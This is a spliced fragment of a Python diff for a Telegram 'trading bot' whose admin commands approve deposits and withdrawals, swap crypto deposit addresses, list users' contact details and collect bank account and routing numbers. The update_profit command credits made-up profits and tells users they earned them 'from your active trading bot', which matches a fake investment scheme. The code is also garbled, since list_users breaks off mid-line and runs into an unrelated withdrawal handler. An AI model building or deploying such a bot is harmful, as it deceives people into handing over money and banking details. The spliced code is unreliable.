+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']
